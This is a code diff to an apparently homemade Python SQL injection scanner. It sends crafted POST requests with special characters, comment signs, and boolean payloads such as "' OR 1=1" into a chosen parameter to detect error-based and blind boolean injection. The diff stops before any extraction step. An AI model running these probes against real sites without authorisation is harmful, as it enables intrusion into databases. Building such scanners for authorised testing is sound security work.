@@ -11,14 +11,22 @@ from Enums import HTTP_Types
 # communication with user
 SQLI_DETECTED_MSG = "SQLi may have been detected!\n"
 SQLI_NOT_DETECTED_MSG = "SQLi not detected. \n"
+SQLI_NO_COMMENT_SIGN_DETECTED = "Cannot find commenting option. \n"
+BOOLEAN_BSQLI_ENABLED = "Boolean blind sqli is possible! \n"
+BOOLEAN_BSQLI_DISABLED = "Boolean blind sqli is not possible. \n"
 
 # chars and seperators
 HEADER_SEP = ": "
 AMPERSAND = "&"
 EQUAL_SIGN = "="
+APOSTROPHE = '\''
 
-# flags
-SQLI_NOT_DETECTED = "no"
+# strings and flags for the program
+NOT_DETECTED = "no"
+
+# sql queries
+BLIND_BOOLEAN_ALWAYS_FALSE = "\' AND 1=0"
+BLIND_BOOLEAN_ALWAYS_TRUE = "\' OR 1=1"
 
 # flags for operating the program
 READ_REQUEST_FILE_FLAG = '-r'
@@ -26,9 +34,15 @@ PARAMETER_FLAG = "-p"
 
 # lists of Strings
 SQL_ERRORS = ["you have an error in your sql syntax"]
+SQL_COMMENTS = [" -- ", "#"]
 SQLI_CHARS = ["\'", "\0", "\\", "-", "%", "#"]
 
 def parse_request_file(request_filepath):
+    """
+    parses a txt file of a request (copied from fiddler, for example) into a HTTPRequest Object
+    :param request_filepath: the path to the txt file
+    :return: a HTTPRequest object containing all the data
+    """
     with open(request_filepath) as fp:
         lines = fp.read().splitlines()
     request = HTTPRequest()
@@ -52,6 +66,11 @@ def parse_request_file(request_filepath):
 
 
 def get_request_copy(request):
+    """
+    creates a deep copy of a HTTPRequest object and all of its attributes
+    :param request: the object we want to copy
+    :return: a copy of this object
+    """
     new_request = copy.deepcopy(request)
     new_parameters = copy.deepcopy(request.get_parameters())
     new_headers = copy.deepcopy(request.get_headers())
@@ -61,15 +80,32 @@ def get_request_copy(request):
 
 
 def send_post_request(request):
+    """
+    sends post request
+    :param request: a HTTPRequest object containing all the data we want to send
+    :return: the response
+    """
     return requests.post(request.get_url(), data=request.get_parameters(), headers=request.get_headers())
 
 
 def send_request(request):
+    """
+    redirects the request to the relevant function, according to the HTTP method we want to use
+    :param request: a HTTPRequest object containing all the data we want to send
+    :return: the response
+    """
     if request.get_method() == HTTP_Types.POST:
         return send_post_request(request)
 
 
 def find_sqli(request, parameter):
+    """
+    checks if the parameter given is sqli vulnerable by sending multiple requests to the server with different special
+    characters and checking whether the response contains an error message
+    :param request: a HTTPRequest object whose data we will change and send
+    :param parameter: the GET/POST parameter we want to check
+    :return: the character causing the error, or NOT_DETECTED string if no error was caused
+    """
     for char in SQLI_CHARS:
         request.set_parameter(parameter, char)
         response = send_request(request)
@@ -78,8 +114,43 @@ def find_sqli(request, parameter):
                 print(SQLI_DETECTED_MSG)
                 return char
     print(SQLI_NOT_DETECTED_MSG)
-    return SQLI_NOT_DETECTED
+    return NOT_DETECTED
 
+def find_comment_sign(request, parameter):
+    """
+    checks which char is valid as a comment starter
+    :param request: a HTTPRequest object whose data we will change and send
+    :param parameter: the GET/POST parameter which is exploitable
+    :return: the character marking a comment, or NOT_DETECTED string if no error was caused
+    """
+    for sign in SQL_COMMENTS:
+        request.set_parameter(parameter, APOSTROPHE + sign)
+        response = send_request(request)
+        for error_msg in SQL_ERRORS:
+            if error_msg not in response.text.lower():
+                return sign
+    print(SQLI_NO_COMMENT_SIGN_DETECTED)
+    return NOT_DETECTED
+
+
+def check_if_boolean_based_is_possible(request, parameter, comment):
+    """
+    check if blind boolean based sqli is possible by sending an always true parameter, an always false parameter and
+    comparing the results
+    :param request: a HTTPRequest object whose data we will change and send
+    :param parameter: the GET/POST parameter which is exploitable
+    :param comment: the comment chars
+    :return: a tuple of the reponses in case of false and true queries, and NOT_DETECTED if they are identical
+    """
+    request.set_parameter(parameter, BLIND_BOOLEAN_ALWAYS_FALSE+comment)
+    boolean_false = send_request(request)
+    request.set_parameter(parameter, BLIND_BOOLEAN_ALWAYS_TRUE + comment)
+    boolean_true = send_request(request)
+    if boolean_true.text != boolean_false.text:
+        print(BOOLEAN_BSQLI_ENABLED)
+        return boolean_false, boolean_true
+    print(BOOLEAN_BSQLI_DISABLED)
+    return NOT_DETECTED
 
 
 if __name__ == '__main__':
@@ -87,6 +158,12 @@ if __name__ == '__main__':
     parameter = "username"
     request = get_request_copy(origin_request)
     is_there_sqli = find_sqli(request, parameter)
-    if is_there_sqli == SQLI_NOT_DETECTED:
+    if is_there_sqli == NOT_DETECTED:
         exit(0)
-    
+    comment = find_comment_sign(request, parameter)
+    if comment == NOT_DETECTED:
+        exit(0)
+    is_boolean_possible = check_if_boolean_based_is_possible(request, parameter, comment)
+    #if is_boolean_possible != NOT_DETECTED: # boolean is possible!
+     
+
